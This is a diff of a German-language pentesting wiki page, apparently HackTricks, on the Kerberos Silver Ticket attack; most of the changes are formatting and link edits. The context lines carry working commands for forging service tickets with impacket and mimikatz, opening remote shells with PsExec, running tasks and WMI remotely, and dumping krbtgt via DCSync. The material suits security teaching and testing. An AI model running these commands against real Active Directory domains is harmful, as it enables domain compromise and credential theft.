@@ -1,4 +1,4 @@
-# Silberticket
+# Silver Ticket
 
 <details>
 
@@ -27,12 +27,15 @@ Der **Silberticket**-Angriff beinhaltet die Ausnutzung von Diensttickets in Acti
 Für das Ticket-Handling werden verschiedene Tools je nach Betriebssystem verwendet:
 
 ### Auf Linux
+
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
+
 ### Auf Windows
+
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -44,18 +47,19 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+
 ## Verfügbare Dienste
 
-| Diensttyp                                  | Dienst Silber Tickets                                                     |
-| ------------------------------------------ | -------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell-Remoting                        | <p>HOST</p><p>HTTP</p><p>Je nach Betriebssystem auch:</p><p>WSMAN</p><p>RPCSS</p> |
+| Diensttyp                                  | Dienst Silber Tickets                                                                |
+| ------------------------------------------ | ------------------------------------------------------------------------------------ |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                              |
+| PowerShell-Remoting                        | <p>HOST</p><p>HTTP</p><p>Je nach Betriebssystem auch:</p><p>WSMAN</p><p>RPCSS</p>    |
 | WinRM                                      | <p>HOST</p><p>HTTP</p><p>In einigen Fällen können Sie einfach nach: WINRM fragen</p> |
-| Geplante Aufgaben                          | HOST                                                                       |
-| Windows-Dateifreigabe, auch psexec         | CIFS                                                                       |
-| LDAP-Operationen, einschließlich DCSync    | LDAP                                                                       |
-| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Goldene Tickets                            | krbtgt                                                                     |
+| Geplante Aufgaben                          | HOST                                                                                 |
+| Windows-Dateifreigabe, auch psexec         | CIFS                                                                                 |
+| LDAP-Operationen, einschließlich DCSync    | LDAP                                                                                 |
+| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                                   |
+| Goldene Tickets                            | krbtgt                                                                               |
 
 Mit **Rubeus** können Sie **alle** diese Tickets mit dem Parameter anfordern:
 
@@ -74,14 +78,17 @@ In den folgenden Beispielen nehmen wir an, dass das Ticket unter der Identität 
 ### CIFS
 
 Mit diesem Ticket können Sie auf die Ordner `C$` und `ADMIN$` über **SMB** zugreifen (sofern sie freigegeben sind) und Dateien auf einem Teil des entfernten Dateisystems kopieren, indem Sie einfach etwas wie:
+
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
+
 ### HOST
 
 Mit dieser Berechtigung können Sie geplante Aufgaben in entfernten Computern erstellen und beliebige Befehle ausführen:
+
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -93,9 +100,11 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
+
 ### HOST + RPCSS
 
 Mit diesen Tickets können Sie **WMI im Zielsystem ausführen**:
+
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -105,16 +114,19 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
+
 ### HOST + WSMAN (WINRM)
 
 Mit WinRM-Zugriff auf einen Computer können Sie **darauf zugreifen** und sogar eine PowerShell erhalten:
+
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
+
 Überprüfen Sie die folgende Seite, um **weitere Möglichkeiten zur Verbindung mit einem Remote-Host über WinRM** zu erfahren:
 
-{% content-ref url="../ntlm/winrm.md" %}
-[winrm.md](../ntlm/winrm.md)
+{% content-ref url="../lateral-movement/winrm.md" %}
+[winrm.md](../lateral-movement/winrm.md)
 {% endcontent-ref %}
 
 {% hint style="warning" %}
@@ -124,9 +136,11 @@ Beachten Sie, dass **WinRM aktiv und auf dem Remote-Computer hörend** sein muss
 ### LDAP
 
 Mit diesem Privileg können Sie die DC-Datenbank mithilfe von **DCSync** dumpen:
+
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+
 **Erfahren Sie mehr über DCSync** auf der folgenden Seite:
 
 ## Referenzen
